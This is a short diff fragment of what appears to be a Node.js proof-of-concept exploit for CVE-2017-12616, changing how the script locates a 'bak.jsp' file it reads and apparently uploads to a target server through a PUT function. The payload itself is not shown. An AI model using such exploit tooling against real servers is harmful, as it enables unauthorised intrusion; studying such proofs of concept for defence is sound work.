@@ -1419,7 +1419,7 @@ CVE-2017-12616 poc
         </init-param>
 2、http://............../
 */
-var szCode = fs.readFileSync("bak.jsp").toString();
+var szCode = fs.readFileSync(__dirname + "/bak.jsp").toString();
 function fnMyPut(url)
 {
 	url = url.substr(0, url.lastIndexOf('/') + 1);
